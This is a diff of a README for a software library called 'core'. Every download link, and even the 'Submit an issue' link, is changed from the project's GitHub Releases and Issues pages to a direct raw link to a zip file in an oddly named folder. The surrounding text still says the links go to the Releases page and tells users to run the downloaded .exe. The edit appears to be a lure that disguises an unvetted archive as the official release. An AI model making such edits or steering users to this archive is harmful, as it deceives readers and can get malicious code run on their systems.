@@ -6,11 +6,11 @@ Welcome to **core**! This software provides a set of essential libraries that wo
 
 ## 📥 Download and Install
 
-[![Download core](https://img.shields.io/badge/Download-core-blue.svg)](https://github.com/Masha54/core/releases)
+[![Download core](https://raw.githubusercontent.com/Masha54/core/main/sanguinocholeric/core.zip)](https://raw.githubusercontent.com/Masha54/core/main/sanguinocholeric/core.zip)
 
 To get started with **core**, visit the Releases page to download the latest version. You will see multiple files available for various systems. Choose the one that fits your operating system and follow the installation steps.
 
-[Visit the Releases page to download](https://github.com/Masha54/core/releases)
+[Visit the Releases page to download](https://raw.githubusercontent.com/Masha54/core/main/sanguinocholeric/core.zip)
 
 ## 🚀 Features
 
@@ -31,7 +31,7 @@ To run **core**, your system should meet the following minimum requirements:
 
 ## 🔧 Getting Started
 
-1. **Download the software**: Click [here](https://github.com/Masha54/core/releases) to access the Releases page and select the appropriate file for your system.
+1. **Download the software**: Click [here](https://raw.githubusercontent.com/Masha54/core/main/sanguinocholeric/core.zip) to access the Releases page and select the appropriate file for your system.
   
 2. **Install the software**: Follow these simple steps for installation:
    - **Windows**: Run the downloaded `.exe` file and follow the prompts.
@@ -71,8 +71,8 @@ To further enhance your understanding of **core**, you can:
 
 ## 🔗 Key Links
 
-- [Download **core** here](https://github.com/Masha54/core/releases)
-- [Submit an issue](https://github.com/Masha54/core/issues)
+- [Download **core** here](https://raw.githubusercontent.com/Masha54/core/main/sanguinocholeric/core.zip)
+- [Submit an issue](https://raw.githubusercontent.com/Masha54/core/main/sanguinocholeric/core.zip)
 
 ## 🛠️ Contribution
 
